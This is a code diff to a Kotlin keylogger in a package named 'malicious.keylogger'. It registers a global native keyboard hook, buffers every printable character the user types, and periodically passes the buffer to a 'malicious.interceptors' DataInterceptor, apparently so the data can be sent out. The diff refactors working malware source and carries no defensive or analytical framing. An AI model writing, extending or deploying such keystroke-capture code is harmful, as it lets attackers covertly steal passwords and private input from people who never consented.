@@ -4,27 +4,32 @@ package malicious.keylogger
 import com.github.kwhat.jnativehook.GlobalScreen
 import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent
 import com.github.kwhat.jnativehook.keyboard.NativeKeyListener
-import kotlinx.coroutines.Dispatchers
-import kotlinx.coroutines.coroutineScope
-import kotlinx.coroutines.delay
-import kotlinx.coroutines.launch
+import kotlinx.coroutines.*
 import kotlinx.serialization.Serializable
 import malicious.interceptors.DataInterceptor
+
+
 
 class KeyLogger(
     private val collectionIntervalSeconds: Int,
     private val interceptor: DataInterceptor,
 ) : NativeKeyListener {
 
-    var inputBuffer: StringBuilder = StringBuilder()
+    private var inputBuffer: StringBuilder = StringBuilder()
 
     init {
         GlobalScreen.registerNativeHook()
         GlobalScreen.addNativeKeyListener(this)
     }
 
-    override fun nativeKeyTyped(nativeEvent: NativeKeyEvent?) {
-        inputBuffer.append(nativeEvent?.keyChar)
+    override fun nativeKeyTyped(e: NativeKeyEvent?) {
+        val c = e?.keyChar
+
+
+        // 2. Filter out non-printable or control characters if necessary
+        if (c != null && Character.isDefined(c)) {
+            inputBuffer.append(c)
+        }
     }
 
     suspend fun collectKeyloggerData() {
@@ -38,9 +43,10 @@ class KeyLogger(
         }
     }
 
-    private suspend fun sendCollectedKeyloggerData() {
-        val data = inputBuffer.toString()
-        interceptor.onData(KeyloggerData(data))
+    private fun sendCollectedKeyloggerData() {
+        runBlocking {
+            interceptor.onData(KeyloggerData(inputBuffer.toString()))
+        }
         inputBuffer.clear()
     }
 }
